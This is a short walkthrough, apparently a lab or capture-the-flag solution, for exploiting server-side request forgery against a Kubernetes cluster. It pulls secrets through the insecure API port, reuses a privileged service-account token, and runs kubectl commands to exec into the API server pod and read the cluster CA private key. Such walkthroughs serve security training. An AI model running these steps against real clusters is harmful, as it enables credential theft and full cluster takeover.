# SSRF to Insecure Port

The application provides the facility to do GET and POST requests, so there's a couple of different ways to approach this.

One option would be

1. Get a list of secrets using the GET SSRF endpoint
  - http://127.0.0.1:8080/api/v1/secrets
2. Get a secret that has privileges on the API server (e.g. clusterrole-aggregation-controller-token)
3. Find the token: field and make a copy of it
4. Base64 decode the token (one way to do that https://gchq.github.io/CyberChef)
5. use the token to make requests to the exposed API server 
   1. `kubectl --insecure-skip-tls-verify --token=[TOKEN] -shttps://[CLUSTERIP]:6443 get po -n kube-system`
   2. `kubectl --insecure-skip-tls-verify --token=[TOKEN] -shttps://[CLUSTERIP]:6443 -n kube-system exec [APISERVERPOD] cat /etc/kubernetes/pki/ca.key`